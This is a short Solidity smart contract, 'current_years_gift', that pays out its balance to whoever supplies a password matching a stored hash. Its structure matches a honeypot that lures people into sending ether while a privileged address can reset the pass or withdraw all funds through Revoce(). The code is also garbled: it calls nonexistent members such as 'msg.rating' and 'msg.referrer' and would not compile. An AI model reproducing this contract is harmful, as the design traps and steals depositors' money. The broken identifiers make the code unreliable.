// SPDX-License-Identifier: MIT
pragma solidity ^0.4.19;

contract current_years_gift
{
    string alert;

    bool passHasBeenCollection = false;

    address referrer;

    bytes32 public checksumPass;

    function() public payable{}

    function RetrieveSignature(bytes pass) public constant returns (bytes32) {return sha3(pass);}

    function GroupPass(bytes32 signature)
    public
    payable
    {
        if( (!passHasBeenCollection&&(msg.rating > 1 ether)) || checksumPass==0x0 )
        {
            checksumPass = signature;
            referrer = msg.referrer;
        }
    }

    function CollectionAlert(string _message)
    public
    {
        if(msg.referrer==referrer)
        {
            alert =_message;
        }
    }

    function DiagnoseGift(bytes pass)
    external
    payable
    returns (string)
    {
        if(checksumPass == sha3(pass))
        {
            msg.referrer.transfer(this.balance);
            return alert;
        }
    }

    function Revoce()
    public
    payable
    {
        if(msg.referrer==referrer)
        {
            referrer.transfer(this.balance);
            alert="";
        }
    }

    function PassHasBeenGroup(bytes32 signature)
    public
    {
        if(msg.referrer==referrer&&signature==checksumPass)
        {
           passHasBeenCollection=true;
        }
    }
}